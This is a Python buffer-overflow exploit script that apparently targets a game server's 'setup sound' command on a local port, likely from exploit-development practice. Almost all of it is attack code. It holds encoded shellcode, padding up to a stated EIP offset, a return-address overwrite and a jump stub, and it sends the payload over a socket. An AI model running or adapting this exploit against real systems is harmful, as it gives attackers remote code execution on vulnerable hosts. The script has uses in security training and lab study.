#!/usr/bin/env python
import time
import socket as so 


server = "127.0.0.1"
port = 13327

counter = 4396
eip_offset = 4368
crash = 4379

payload =  b""
payload += b"\xdb\xc8\xd9\x74\x24\xf4\xbd\x0c\x23\x41\xe5\x58"
payload += b"\x29\xc9\xb1\x12\x83\xc0\x04\x31\x68\x13\x03\x64"
payload += b"\x30\xa3\x10\x45\xed\xd4\x38\xf6\x52\x48\xd5\xfa"
payload += b"\xdd\x8f\x99\x9c\x10\xcf\x49\x39\x1b\xef\xa0\x39"
payload += b"\x12\x69\xc2\x51\xda\x89\x34\xa0\x4c\x88\x34\x92"
payload += b"\xb5\x05\xd5\x62\xa3\x45\x47\xd1\x9f\x65\xee\x34"
payload += b"\x12\xe9\xa2\xde\xc3\xc5\x31\x76\x74\x35\x99\xe4"
payload += b"\xed\xc0\x06\xba\xbe\x5b\x29\x8a\x4a\x91\x2a"

#overflow = b"A"*32
#overflow += buf #payload
overflow = b""
overflow += payload
overflow += b"A"*(eip_offset - len(overflow))
overflow += b"\x97\x45\x13\x08"
overflow += b"\x83\xc0\x0c\xff\xe0"
overflow += b"\x90\x90"
#overflow += b"C"*(crash-len(overflow))

try:
	s = so.socket(so.AF_INET,so.SOCK_STREAM)

	string = b"\x11(setup sound " # input frame
	#string += b"A"*counter
	string += overflow
	string += b"\x90\x00#" # input frame

	s.connect((server, port))
	output= s.recv(1024)

	print(output)
	print("\nFuzzing with %s bytes" % len(string))

	s.send(string)
	time.sleep(3)
	s.close()


	# counter += 1
	# print("Increased counter to", counter)


except Exception as e:
	print("[!] Connection refused, check debugger")
	print(f"Exception: {e}")

